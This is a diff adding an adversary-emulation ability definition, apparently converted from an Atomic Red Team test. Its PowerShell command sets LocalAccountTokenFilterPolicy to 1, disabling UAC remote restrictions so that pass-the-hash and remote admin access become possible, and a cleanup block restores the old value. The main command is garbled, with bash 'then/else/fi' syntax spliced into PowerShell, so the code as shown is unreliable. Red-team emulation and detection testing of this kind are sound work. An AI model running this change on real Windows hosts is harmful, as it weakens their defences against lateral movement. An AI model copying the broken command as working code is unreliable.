@@ -1,0 +1,68 @@
+- id: e8c7c404-b669-4cf9-bafd-fdad89a5bbb1
+  name: Disable UAC remote restrictions via LocalAccountTokenFilterPolicy
+  description: 'Sets the LocalAccountTokenFilterPolicy registry value to 1 under
+
+    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System. This disables
+    UAC
+
+    remote restrictions (token filtering) so that local administrator accounts receive
+
+    a full (non-filtered) high-integrity token when authenticating over the network,
+
+    enabling remote administrative actions such as Pass-the-Hash and remote WMI/SMB
+
+    admin access.'
+  tactic: persistence
+  technique:
+    attack_id: T1112
+    name: Modify Registry
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "$env:TEMP\T1112_LATP_backup.txt") { exit 0 } else
+          { exit 1 }; then : ; else $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
+          $prop = Get-ItemProperty -Path $regPath -Name "LocalAccountTokenFilterPolicy"
+          -ErrorAction SilentlyContinue; if ($prop -eq $null) { "notpresent" | Out-File
+          "$env:TEMP\T1112_LATP_backup.txt" } else { $prop.LocalAccountTokenFilterPolicy
+          | Out-File "$env:TEMP\T1112_LATP_backup.txt" }; fi; Set-ItemProperty -Path
+          "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name
+          "LocalAccountTokenFilterPolicy" -Type DWord -Value 1 -Force'
+        cleanup: $backupFile = "$env:TEMP\T1112_LATP_backup.txt"; $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
+          if (Test-Path $backupFile) {; $orig = (Get-Content $backupFile).Trim();
+          if ($orig -eq "notpresent") {; Remove-ItemProperty -Path $regPath -Name
+          "LocalAccountTokenFilterPolicy" -Force -ErrorAction Ignore; } else {; Set-ItemProperty
+          -Path $regPath -Name "LocalAccountTokenFilterPolicy" -Type DWord -Value
+          ([int]$orig) -Force; }; Remove-Item $backupFile -Force; }
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1112
+  - atomic-red-team
+  - persistence
+  author: Atomic Red Team
+  additional_info:
+    dependencies:
+    - description: 'Save current LocalAccountTokenFilterPolicy state for cleanup restore.
+
+        '
+      prereq_command: 'if (Test-Path "$env:TEMP\T1112_LATP_backup.txt") { exit 0 }
+        else { exit 1 }
+
+        '
+      get_prereq_command: '$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+
+        $prop = Get-ItemProperty -Path $regPath -Name "LocalAccountTokenFilterPolicy"
+        -ErrorAction SilentlyContinue
+
+        if ($prop -eq $null) { "notpresent" | Out-File "$env:TEMP\T1112_LATP_backup.txt"
+        } else { $prop.LocalAccountTokenFilterPolicy | Out-File "$env:TEMP\T1112_LATP_backup.txt"
+        }
+
+        '
+    technique_created: '2017-05-31T21:31:23.587Z'
+    atomic_guid: e8c7c404-b669-4cf9-bafd-fdad89a5bbb1
+    import_timestamp: '2026-09-05T06:41:05.690645Z'
